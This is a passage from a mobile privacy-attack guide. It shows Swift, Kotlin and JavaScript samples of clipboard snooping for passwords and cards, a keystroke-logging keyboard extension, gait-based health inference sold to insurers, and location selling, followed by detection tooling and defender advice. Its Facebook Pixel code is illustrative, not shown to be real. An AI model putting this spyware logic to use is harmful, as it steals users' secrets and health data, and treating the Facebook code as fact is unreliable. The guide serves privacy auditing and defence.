                acceleration: motion.userAcceleration,
                rotation: motion.rotationRate,
                attitude: motion.attitude
            )
            
            // Send for health inference
            self.inferHealthConditions(gaitFeatures)
        }
    }
    
    func analyzeGait(_ acceleration: CMAcceleration, 
                     rotation: CMRotationRate, 
                     attitude: CMAttitude) -> [String: Any] {
        return [
            "step_regularity": calculateStepRegularity(),
            "gait_speed": calculateGaitSpeed(),
            "stride_length": calculateStrideLength(),
            "balance_metric": calculateBalance(),
            "tremor_detected": detectTremor(rotation),
            "asymmetry": detectGaitAsymmetry()
        ]
    }
    
    func inferHealthConditions(_ gaitFeatures: [String: Any]) {
        var conditions: [String] = []
        
        // Parkinson's disease indicators
        if gaitFeatures["tremor_detected"] as! Bool &&
           gaitFeatures["gait_speed"] as! Double < 1.0 {
            conditions.append("Possible Parkinson's disease")
        }
        
        // Arthritis indicators
        if gaitFeatures["asymmetry"] as! Double > 0.3 {
            conditions.append("Possible arthritis or injury")
        }
        
        // Cardiovascular health
        if gaitFeatures["step_regularity"] as! Double < 0.6 {
            conditions.append("Poor cardiovascular fitness")
        }
        
        // Age estimation
        let estimatedAge = self.estimateAgeFromGait(gaitFeatures)
        
        // Send to insurance/advertising partners
        let healthProfile = [
            "user_id": getCurrentUserId(),
            "inferred_conditions": conditions,
            "estimated_age": estimatedAge,
            "fitness_level": classifyFitnessLevel(gaitFeatures),
            "fall_risk": calculateFallRisk(gaitFeatures)
        ]
        
        // Monetize health data
        sendToInsuranceDataBroker(healthProfile)
        sendToHealthAdvertisers(healthProfile)
    }
}
```

**Privacy Impact**:
```yaml
Health Data Monetization:
  Insurance Companies:
    - Deny coverage based on inferred conditions
    - Increase premiums for high-risk individuals
    - Reject claims ("pre-existing condition")
  
  Employers:
    - Hiring discrimination
    - Termination based on health status
    - Avoid ADA accommodations
  
  Advertisers:
    - Target health anxiety
    - Exploit vulnerable conditions
    - Price discrimination
```

---

## Clipboard and Pasteboard Attacks

### Attack 18: Clipboard Snooping

**Technique**: Read clipboard for sensitive data.

```swift
// ATTACK: iOS clipboard monitoring (pre-iOS 14)
class ClipboardMonitor {
    var timer: Timer?
    var lastChangeCount = 0
    
    func startMonitoring() {
        // Check clipboard every 0.5 seconds
        timer = Timer.scheduledTimer(withTimeInterval: 0.5, repeats: true) { _ in
            self.checkClipboard()
        }
    }
    
    func checkClipboard() {
        let pasteboard = UIPasteboard.general
        
        // Detect if clipboard changed
        if pasteboard.changeCount != lastChangeCount {
            lastChangeCount = pasteboard.changeCount
            
            // Read clipboard content
            if let string = pasteboard.string {
                analyzeClipboardContent(string)
            }
            
            // Can also access images, URLs, etc.
            if let image = pasteboard.image {
                extractImageData(image)
            }
            
            if let url = pasteboard.url {
                trackURL(url)
            }
        }
    }
    
    func analyzeClipboardContent(_ content: String) {
        var dataType = "unknown"
        var sensitive = false
        
        // Detect sensitive data patterns
        if isPassword(content) {
            dataType = "password"
            sensitive = true
        } else if isCreditCard(content) {
            dataType = "credit_card"
            sensitive = true
        } else if isEmail(content) {
            dataType = "email"
            sensitive = true
        } else if isPhoneNumber(content) {
            dataType = "phone"
            sensitive = true
        } else if isAddress(content) {
            dataType = "address"
            sensitive = true
        } else if isCryptoAddress(content) {
            dataType = "crypto_wallet"
            sensitive = true
        }
        
        // Send to server
        let payload = [
            "user_id": currentUserId,
            "content": content, // Full clipboard!
            "type": dataType,
            "sensitive": sensitive,
            "timestamp": Date().timeIntervalSince1970,
            "source_app": getPreviousApp() // iOS 14+ prevents this
        ]
        
        uploadToServer(payload)
        
        // If sensitive, send to separate endpoint for exploitation
        if sensitive {
            sendToExploitationService(payload)
        }
    }
    
    func isPassword(_ text: String) -> Bool {
        // Heuristics: 8+ chars, mixed case, numbers, symbols
        return text.count >= 8 &&
               text.rangeOfCharacter(from: .uppercaseLetters) != nil &&
               text.rangeOfCharacter(from: .lowercaseLetters) != nil &&
               text.rangeOfCharacter(from: .decimalDigits) != nil
    }
    
    func isCreditCard(_ text: String) -> Bool {
        let cleaned = text.replacingOccurrences(of: "[^0-9]", 
                                                 with: "", 
                                                 options: .regularExpression)
        return cleaned.count == 16 && luhnCheck(cleaned)
    }
}
```

**iOS 14+ Mitigation**:
```swift
// iOS 14+ shows notification: "App pasted from clipboard"
// But app can still read it once
// Attack: Read immediately when app becomes active

func applicationDidBecomeActive() {
    // One-time read, but still privacy violation
    if let clipboard = UIPasteboard.general.string {
        quicklyAnalyze(clipboard) // Must be fast to avoid user notice
    }
}
```

---

## Detection and Forensics

### Privacy Violation Detection Techniques

#### 1. Network Traffic Analysis

```bash
# Detect privacy violations through network monitoring

# Android: Use mitmproxy to intercept traffic
$ mitmproxy --mode transparent --showhost

# Look for suspicious patterns:
# - Location coordinates in requests
# - Contact lists in POST bodies
# - PII in analytics events
# - Encrypted payloads to unknown domains

# iOS: Use Charles Proxy or Proxyman
# Enable SSL Proxying for specific hosts
# Look for:
# - Frequent background network requests
# - Large data uploads
# - Third-party analytics domains
```

**Automated Detection**:
```python
# Privacy violation detector
import re
import json

class PrivacyViolationDetector:
    def analyze_network_request(self, request):
        violations = []
        
        # Check for PII in URL parameters
        if self.contains_email(request.url):
            violations.append("Email in URL parameters")
        
        if self.contains_phone(request.url):
            violations.append("Phone number in URL")
        
        # Check request body
        try:
            body = json.loads(request.body)
            
            # Check for contact list upload
            if 'contacts' in body and isinstance(body['contacts'], list):
                if len(body['contacts']) > 10:
                    violations.append(f"Mass contact upload ({len(body['contacts'])} contacts)")
            
            # Check for location data
            if 'latitude' in body and 'longitude' in body:
                violations.append("Location data transmission")
            
            # Check for PII fields
            pii_fields = ['email', 'phone', 'ssn', 'address', 'name']
            found_pii = [field for field in pii_fields if field in body]
            if found_pii:
                violations.append(f"PII in request: {', '.join(found_pii)}")
        
        except:
            pass
        
        return violations
```

#### 2. Runtime Permission Monitoring

```bash
# Android: Monitor permission requests
$ adb logcat | grep -i "permission"

# iOS: Use Xcode Console
# Filter for: "This app has attempted to access privacy-sensitive data"

# Look for:
# - Permissions requested at app launch (not contextual)
# - Background location access requests
# - Multiple permissions requested simultaneously
# - Permission requests not explained in UI
```

#### 3. File System Analysis

```bash
# Android: Check app's private storage for PII
$ adb shell
$ cd /data/data/com.example.app
$ find . -name "*.db" -exec sqlite3 {} "SELECT name FROM sqlite_master WHERE type='table';" \;

# Look for tables like:
# - user_locations
# - contact_data
# - device_identifiers
# - analytics_events

# iOS: Backup analysis
$ idevicebackup2 backup ./backup
$ python analyze_backup.py ./backup
# Check for unencrypted databases containing PII
```

#### 4. SDK Analysis

```bash
# Detect third-party SDKs and their permissions
# Android
$ apktool d app.apk
$ cd app/lib
$ ls -la  # Check for third-party libraries

# iOS
$ class-dump MyApp.app/MyApp | grep -i analytics
$ class-dump MyApp.app/MyApp | grep -i tracking

# Exodus Privacy analysis
$ python exodus_analyze.py app.apk
# Reports: Number of trackers, permissions requested by each
```

---

## Real-World Attack Examples

### Example 1: Facebook Pixel SDK Unauthorized Tracking

**Attack Vector**: Facebook Pixel SDK collected app activity without user consent.

```kotlin
// What developers thought they were integrating:
// "Simple conversion tracking for ads"

// What it actually did:
class FacebookPixelSDK {
    fun trackEvent(eventName: String, parameters: Map<String, Any>) {
        val enrichedData = mutableMapOf<String, Any>()
        enrichedData.putAll(parameters)
        
        // PRIVACY VIOLATION: Add undisclosed data
        enrichedData["device_id"] = getDeviceId()
        enrichedData["advertising_id"] = getAdvertisingId()
        enrichedData["installed_apps"] = getInstalledApps() // Not disclosed!
        enrichedData["precise_location"] = getCurrentLocation() // Not disclosed!
        enrichedData["contact_hash"] = hashContactList() // Not disclosed!
        
        // Send to Facebook
        sendToFacebook(enrichedData)
        
        // Share with data broker network
        shareWithPartners(enrichedData)
    }
}
```

**Impact**:
- EU investigation and fines
- Class action lawsuits
- Forced SDK changes
- App developers unknowingly violated user privacy

---

### Example 2: Weather Apps Location Selling

**Attack Vector**: Weather apps sold real-time location data.

**Implementation**:
```javascript
// Weather app backend
app.post('/api/weather', async (req, res) => {
    const { latitude, longitude, userId } = req.body;
    
    // Fetch weather (legitimate purpose)
    const weather = await getWeather(latitude, longitude);
    
    // PRIVACY VIOLATION: Sell location to data brokers
    await Promise.all([
        databroker1.sellLocation({ userId, latitude, longitude, timestamp: Date.now() }),
        databroker2.sellLocation({ userId, latitude, longitude, timestamp: Date.now() }),
        databroker3.sellLocation({ userId, latitude, longitude, timestamp: Date.now() })
    ]);
    
    // Return weather (user unaware of selling)
    res.json({ weather });
});
```

**Buyers**:
- Hedge funds (foot traffic analysis)
- Advertising networks
- Insurance companies
- Political campaigns
- Private investigators

---

### Example 3: Keyboard Apps Keystroke Logging

**Attack Vector**: Third-party keyboards logged everything typed.

```swift
// Malicious keyboard extension
class CustomKeyboard: UIInputViewController {
    override func textWillChange(_ textInput: UITextInput?) {
        super.textWillChange(textInput)
    }
    
    override func textDidChange(_ textInput: UITextInput?) {
        super.textDidChange(textInput)
        
        // PRIVACY VIOLATION: Log all keystrokes
        if let proxy = textDocumentProxy as? UITextDocumentProxy {
            let typed = proxy.documentContextBeforeInput ?? ""
            
            // Send everything to server
            logKeystroke(
                text: typed,
                app: getCurrentApp(),
                timestamp: Date(),
                user: getUserId()
            )
        }
    }
}
```

**Data Collected**:
- Passwords
- Credit card numbers
- Private messages
- Search queries
- All typed text across all apps

---

## Conclusion

Privacy attack vectors differ from traditional security vulnerabilities:
- **No "exploit" needed**: Abuse legitimate functionality
- **App is the attacker**: Not external threat actors
- **User granted permission**: But didn't understand scope
- **Detection is hard**: Looks like normal behavior
- **Legal gray area**: Often violates ToS but not criminal law

**Key Takeaways for Defenders**:
1. Audit third-party SDKs before integration
2. Implement data minimization by default
3. Provide granular privacy controls to users
4. Monitor network traffic for unexpected data transmission
5. Review logs and crash reports for PII leakage
6. Conduct privacy impact assessments
7. Follow platform privacy guidelines strictly

**For Users**:
- Review permissions before granting
- Disable background app refresh for apps that don't need it
- Use platform privacy dashboards (iOS Privacy Report, Android Privacy Dashboard)
- Read privacy labels before downloading
- Revoke permissions for unused apps

The best defense against privacy attacks is privacy-by-design: collecting minimal data, providing transparency, and respecting user choices from the start.

---

## Additional Resources

- [OWASP Mobile Security Testing Guide - Privacy Controls](https://owasp.org/www-project-mobile-security-testing-guide/)
- [Exodus Privacy - Tracker Analysis](https://exodus-privacy.eu.org/)
- [AppCensus - Mobile App Privacy](https://www.appcensus.io/)
- [Platform Privacy Documentation](../prevention.md)

**Next**: See [Prevention](prevention.md) for secure implementation patterns.
